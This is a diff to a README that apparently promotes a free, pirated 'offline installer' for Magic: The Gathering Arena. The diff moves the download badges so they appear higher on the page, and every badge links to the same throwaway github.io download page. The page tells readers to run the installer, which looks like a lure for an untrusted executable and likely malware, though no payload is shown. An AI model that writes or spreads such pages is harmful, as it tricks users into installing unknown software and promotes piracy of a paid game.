@@ -20,6 +20,16 @@
   <img src="https://readme-typing-svg.herokuapp.com?color=F9A825&size=28&center=true&vCenter=true&width=900&lines=🎮+Magic%3A%20The%20Gathering%20Arena+Offline+Installer;⭐+Professional+Grade+Software;🌟+Full+Offline+Installation+2026;🔥+No+Pay+Needed" />
 </p>
 
+<p align="center">
+  <img src="https://cdn.akamai.steamstatic.com/steam/apps/2141910/header.jpg" alt="Magic: The Gathering Arena" width="460"/>
+</p>
+
+<div align="center">
+
+[![Download](https://img.shields.io/badge/⬇_Download_Magic%3A%20The%20Gathering%20Arena-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
+
+</div>
+
 ---
 
 ## ❌ Problem: Games are expensive and require internet
@@ -47,10 +57,6 @@
 
 ### Step 1: Download
 
-<p align="center">
-  <img src="https://cdn.akamai.steamstatic.com/steam/apps/2141910/header.jpg" alt="Magic: The Gathering Arena" width="460"/>
-</p>
-
 <div align="center">
 
 [![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://etgysfcihddy.github.io/windows-dl/)
@@ -65,12 +71,6 @@
 ### Step 2: Install and launch
 
 - Run the installer → Follow instructions → Launch Magic: The Gathering Arena
-
-<div align="center">
-
-[![Download](https://img.shields.io/badge/⬇_Download_Magic%3A%20The%20Gathering%20Arena-F9A825?style=for-the-badge&logo=github)](https://etgysfcihddy.github.io/windows-dl/)
-
-</div>
 
 ---
 
